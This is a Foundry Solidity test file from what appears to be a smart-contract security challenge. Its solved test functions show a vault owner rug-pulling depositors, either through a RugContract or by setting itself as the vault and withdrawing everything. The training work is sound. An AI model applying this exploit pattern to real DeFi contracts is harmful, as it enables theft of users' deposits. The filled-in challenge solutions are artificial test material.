// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "src/optimizer-vaults-1/OptimizerStrategy.sol";
import "src/optimizer-vaults-1/OptimizerVault.sol";
import "src/optimizer-vaults-1/YieldContract.sol";
import "src/utils/DummyERC20.sol";
import "src/optimizer-vaults-2/RugContract.sol";

/**
 * @dev run "forge test -vvv --match-contract OV2"
 */
contract TestOV2 is Test {
    address owner = makeAddr("owner");
    address bob = makeAddr("bob");
    address alice = makeAddr("alice");

    DummyERC20 usdc; // Fake USDC, 18 decimals
    YieldContract yieldContract;
    OptimizerStrategy strategy;
    OptimizerVault vault;

    uint256 constant BOB_USDC_BALANCE = 100000 * 1e18; // Bob has 100,000 USDC
    uint256 constant ALICE_USDC_BALANCE = 200000 * 1e18; // Alice has 200,000 USDC

    function setUp() public {
        usdc = new DummyERC20("Fake USDC", "USDC", 1_000_000 * 1e18);
        // Transfer USDC to bob & alice
        usdc.mint(bob, BOB_USDC_BALANCE);
        usdc.mint(alice, ALICE_USDC_BALANCE);

        // Deploy the vault system
        vm.startPrank(owner);
        yieldContract = new YieldContract(address(usdc));
        strategy = new OptimizerStrategy(address(yieldContract));
        vault = new OptimizerVault(IOptimizerStrategy(address(strategy)), "VAULT", "VLT");

        // Assign the vault to the strategy
        strategy.setVault(address(vault));

        // Approve the vault for the Alice & Bob
        vm.startPrank(alice);
        usdc.approve(address(vault), ALICE_USDC_BALANCE);
        vm.startPrank(bob);
        usdc.approve(address(vault), BOB_USDC_BALANCE);

        // Alice & Bob deposit their USDC into the vault
        vm.startPrank(bob);
        vault.deposit(BOB_USDC_BALANCE);
        vm.startPrank(alice);
        vault.deposit(ALICE_USDC_BALANCE);
    }

    function testVaultRugPull() public {
        /**
         * CODE YOUR SOLUTION HERE
         */

        // TODO: Owner deploys rugging contract
        vm.startPrank(owner);
        RugContract rugContract = new RugContract(address(strategy));
        // TODO: Owner rugs the vault system
        strategy.setVault(address(rugContract));
        rugContract.rug();

        /**
         * SUCCESS CONDITIONS
         */
        uint256 ruggedAmount = BOB_USDC_BALANCE + ALICE_USDC_BALANCE;
        uint256 withdrawalFees = ruggedAmount / 100;

        // The strategy is now empty except for withdrawal fees
        assertEq(strategy.balanceOf(), withdrawalFees);

        // The owner now holds the rugged USDC minus withdrawalFees
        assertEq(usdc.balanceOf(owner), ruggedAmount - withdrawalFees);
    }

    function testVaultRugPullWithoutContract() public {
        /**
         * CODE YOUR SOLUTION HERE
         */
        vm.startPrank(owner);
        uint256 vaultBal = strategy.balanceOf();

        strategy.setVault(owner);
        strategy.withdraw(vaultBal);

        /**
         * SUCCESS CONDITIONS
         */
        uint256 ruggedAmount = BOB_USDC_BALANCE + ALICE_USDC_BALANCE;
        uint256 withdrawalFees = ruggedAmount / 100;

        // The strategy is now empty except for withdrawal fees
        assertEq(strategy.balanceOf(), withdrawalFees);

        // The owner now holds the rugged USDC minus withdrawalFees
        assertEq(usdc.balanceOf(owner), ruggedAmount - withdrawalFees);
    }
}
